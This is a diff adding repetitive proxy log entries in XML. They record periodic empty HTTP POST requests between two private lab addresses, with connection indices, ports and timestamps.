+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:39'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000020
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000020</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49323</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>32</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49323</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:42'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49324</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:42'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000021
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000021</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49324</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>33</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49324</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:45'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49325</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:45'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000022
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000022</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49325</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>34</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49325</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:48'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49326</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:48'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000023
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000023</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49326</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>35</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49326</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:51'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49327</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:51'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000024
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000024</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49327</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>36</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49327</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:53'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49328</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:53'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000025
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000025</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49328</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>37</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49328</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:56'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49329</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:56'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000026
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000026</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49329</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>38</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49329</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:59'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49330</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:59'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000027
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000027</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49330</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>39</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49330</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:02'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49331</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:02'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000028
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000028</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49331</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>40</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49331</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:05'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49332</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:05'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000029
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000029</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49332</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>41</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49332</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:08'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49333</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:08'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000002a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000002a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49333</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>42</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49333</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:11'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49334</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:11'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000002b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000002b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49334</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>43</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49334</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:14'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49335</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:14'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000002c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000002c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49335</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>44</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49335</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:16'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49336</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:16'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000002d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000002d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49336</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>45</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49336</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:19'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49337</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:19'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000002e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000002e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49337</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>46</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49337</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:22'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49338</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:22'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000002f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000002f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49338</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>47</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49338</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:25'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49339</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:25'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000030
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000030</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49339</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>48</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49339</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:28'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49340</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:28'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000031
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000031</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49340</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>49</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49340</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:31'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49341</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:31'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000032
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000032</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49341</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>50</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49341</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
